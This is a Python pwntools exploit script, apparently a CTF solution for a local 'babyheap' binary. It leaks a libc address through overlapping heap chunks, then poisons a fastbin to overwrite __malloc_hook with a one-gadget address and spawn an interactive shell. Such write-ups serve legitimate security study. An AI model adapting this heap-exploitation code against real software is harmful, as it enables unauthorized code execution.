#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *
import os


context(arch="amd64", os="linux", endian="little")
#context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.e = ELF("./babyheap")
        self.libc = ELF("/lib/x86_64-linux-gnu/libc-2.24.so")
        self.p = None

    def start_binary(self):
        self.p = process("./babyheap")
        self.p.recvuntil("Command: ")

    def allocate_cmd(self, size):
        self.p.sendline("1")
        self.p.recvuntil("Size: ")
        self.p.sendline(str(size))
        self.p.recvuntil("Command: ")

    def fill_cmd(self, index, size, content):
        self.p.sendline("2")
        self.p.recvuntil("Index: ")
        self.p.sendline(str(index))
        self.p.recvuntil("Size: ")
        self.p.sendline(str(size))
        self.p.recvuntil("Content: ")
        self.p.send(content)
        self.p.recvuntil("Command: ")

    def free_cmd(self, index):
        self.p.sendline("3")
        self.p.recvuntil("Index: ")
        self.p.sendline(str(index))
        self.p.recvuntil("Command: ")

    def dump_cmd(self, index):
        self.p.sendline("4")
        self.p.recvuntil("Index: ")
        self.p.sendline(str(index))
        return self.p.recvuntil("Command: ")

    def leak_libc(self):
        self.allocate_cmd(16)
        self.allocate_cmd(16)
        self.allocate_cmd(16)
        self.allocate_cmd(16)
        self.allocate_cmd(128)
        self.allocate_cmd(128)
        self.free_cmd(2)
        self.free_cmd(1)
        self.fill_cmd(0, 33, "\x00"*24+p64(0x21)+p8(0x80))
        self.fill_cmd(3, 32, "\x00"*24+p64(0x21))
        self.allocate_cmd(16)
        self.allocate_cmd(16)
        self.fill_cmd(3, 32, "\x00"*24+p64(0x91))
        self.free_cmd(4)
        data=self.dump_cmd(2)[10:]
        return u64(data[:6]+"\x00"*2)

    def rewrite_addr(self, src, dest):
        self.allocate_cmd(104)
        self.allocate_cmd(104)
        self.allocate_cmd(104)
        self.allocate_cmd(104)
        self.free_cmd(8)
        self.free_cmd(7)
        self.fill_cmd(6, 120, "\x00"*104+p64(0x70)+p64(src))
        self.allocate_cmd(104)
        self.allocate_cmd(104)
        self.fill_cmd(8, 27, "A"*19+p64(dest))
        self.p.sendline("1")
        self.p.recvuntil("Size: ")
        self.p.sendline(str(1337))
        self.p.interactive()
        self.p.close()

    def pwn_binary(self):
        self.start_binary()

        base_libc=self.leak_libc()-0x399b58
        log.info("Leak libc base address: "+hex(base_libc))

        self.rewrite_addr(base_libc+0x399acd, base_libc+0x3f35a)


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
